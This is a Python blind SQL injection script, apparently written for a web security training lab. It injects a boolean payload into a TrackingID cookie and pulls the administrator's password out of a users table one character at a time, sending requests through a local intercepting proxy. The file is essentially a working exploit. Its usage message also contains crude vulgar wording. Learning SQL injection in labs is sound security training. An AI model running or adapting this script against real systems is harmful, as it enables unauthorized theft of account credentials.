import sys
import requests 
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def pipa(url):     # This is the SQLi passsword
    pipasal = ""   # This is the password extracted
    for i in range(1,21):    # The range need to be one number bigger than the password lengh becouse will test this number -1 
        for j in range(32,126):    # This range is to test also the special characters where 32 is the space and 126 is ~ in ASCII, the SQL payload will converse decimal representation to ASCII
            diente = "' and (select ascii(substring (password,%s,1)) from users where username='administrator')='%s'--" % (i ,j)  # This is the sqli payload converted to ASCII function
            dientepicao =  urllib.parse.quote(diente) # This is the payload encoded
            cookies = {'TrackingID': 'Hqw55atmINkOTJrW' + dientepicao,'session': 'luNWEh1NVg4SPMHA0D1L8mxglnauujIE'} #Pon la trackingID y la sessionID del momento
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)  # In this case we know is using the get method for the request
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + pipasal + chr(j))  # Char J make the characters display in the terminal
                sys.stdout.flush()
            else:
                pipasal += chr(j)
                sys.stdout.write('\r' + pipasal)
                sys.stdout.flush()
                break
                 
def main ():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        print("(+) Example of mi polla: %s www.vagina.ina" % sys.argv[0])
        
    url = sys.argv[1]
    print("(+) Retieving admin pass...")
    pipa(url) 

if __name__ == '__main__':
    main()